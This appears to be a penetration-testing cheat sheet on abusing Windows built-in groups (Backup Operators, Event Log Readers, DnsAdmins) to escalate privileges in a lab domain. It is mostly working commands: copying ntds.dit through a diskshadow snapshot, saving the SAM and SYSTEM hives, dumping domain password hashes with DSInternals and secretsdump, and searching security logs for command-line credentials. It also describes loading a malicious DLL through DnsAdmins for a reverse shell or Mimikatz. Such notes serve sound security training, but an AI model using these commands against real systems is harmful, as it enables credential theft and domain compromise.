# Windows Built-in Groups

* [Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators)
* [Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders)
* [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins)
* [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators)
* [Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators)
* [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators)

## Backup Operators

```Powershell
whoami /priv
whoami /groups

Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
Get-SeBackupPrivilege

# Copying a protected file
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt.txt' .\Contract.txt
```

### Attacking a Domain Controller - Copying NTDS.dit
[Diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)

```Powershell
.\diskshadow.exe

set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit

dir E:\

Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV

# Dumping on Windows
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

### Secretsdump

`secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`

### Robocopy
[Robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)

`robocopy /B E:\Windows\NTDS .\ntds ntds.dit`

# Event Log Readers

```Powershell
net localgroup "Event Log Readers"

# Searching security logs using wevtutil
wevtutil qe Security /rd:true /f:text | Select-String "/user"
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"

# Searching Security Logs using Get-WinEvent
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

The cmdlet can also be run as another user with the `-Credential` parameter.

# DnsAdmins

* DNS management is performed over RPC
* ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line
* When a member of the DnsAdmins group runs the dnscmd command below, the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll registry key is populated
* When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
* An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.
